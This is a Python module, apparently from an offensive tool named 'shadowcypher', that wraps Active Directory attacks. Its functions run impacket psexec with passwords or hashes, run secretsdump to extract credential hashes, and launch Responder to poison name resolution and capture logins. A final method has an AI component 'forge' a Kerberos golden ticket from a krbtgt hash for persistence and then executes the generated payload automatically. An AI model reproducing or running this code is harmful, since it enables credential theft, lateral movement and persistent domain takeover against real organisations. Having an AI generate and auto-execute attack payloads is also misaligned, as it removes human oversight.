"""Active Directory & Internal Network Attacks — Impacket and Responder."""

import os

from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_target


class ADAssessment:
    @staticmethod
    def impacket_psexec(
        target,
        username,
        password,
        domain="",
        hashes="",
        on_output=None,
        on_complete=None,
    ):
        if not validate_target(target):
            if on_output:
                on_output(f"[ERROR] Invalid target: {target}")
            return

        cred_str = ""
        if domain:
            cred_str += f"{domain}/"
        cred_str += username

        if password:
            cred_str += f":{password}"

        cred_str += f"@{target}"

        args = ["impacket-psexec", cred_str]
        if hashes:
            args.extend(["-hashes", hashes])

        logger.info("ad", f"Impacket psexec to {target} as {username}")
        return runner.execute_task(f"PSEXEC_{target}", args, callback=on_output)

    @staticmethod
    def impacket_secretsdump(
        target,
        username,
        password,
        domain="",
        hashes="",
        use_vss=False,
        on_output=None,
        on_complete=None,
    ):
        if not validate_target(target):
            if on_output:
                on_output(f"[ERROR] Invalid target: {target}")
            return

        cred_str = ""
        if domain:
            cred_str += f"{domain}/"
        cred_str += username

        if password:
            cred_str += f":{password}"

        cred_str += f"@{target}"

        args = ["impacket-secretsdump", cred_str]
        if hashes:
            args.extend(["-hashes", hashes])
        if use_vss:
            args.append("-use-vss")

        logger.info("ad", f"Impacket secretsdump to {target} as {username}")
        return runner.execute_task(f"SECRETSDUMP_{target}", args, callback=on_output)

    @staticmethod
    def run_responder(
        interface, analyze_only=False, wpad=True, on_output=None, on_complete=None
    ):
        # Professional Depth Fix: Detect local tools directory
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        responder_path = os.path.join(project_root, "tools", "Responder", "Responder.py")

        if not os.path.exists(responder_path):
            if on_output:
                on_output(
                    f"[ERROR] Responder not found at {responder_path}\n"
                    f"[SYSTEM] install Responder to continue"
                )
            return

        args = ["python3", responder_path, "-I", interface]

        if analyze_only:
            args.append("-A")
        if not wpad:
            args.extend(["-w", "Off"])

        logger.info("ad", f"Running Responder on {interface}")
        return runner.execute_task(f"RESPONDER_{interface}", args, callback=on_output)

    @staticmethod
    def golden_ticket_forge(domain_sid, krbtgt_hash, domain_admin, on_output=None):
        """2026 AI-Forged Golden Ticket: Multi-layered Kerberos persistence synthesis."""
        from shadowcypher.modules.deephat import deephat
        if on_output:
            on_output("[AD] forging golden ticket...\n")

        desc = f"Forge a Kerberos Golden Ticket for domain SID {domain_sid} using krbtgt hash {krbtgt_hash}. Target user: {domain_admin}. Include PAC spoofing for 2026-level persistence."
        filename = deephat.forge_weapon(desc, category="kerberos")
        return deephat.execute_payload(filename, on_output=on_output)
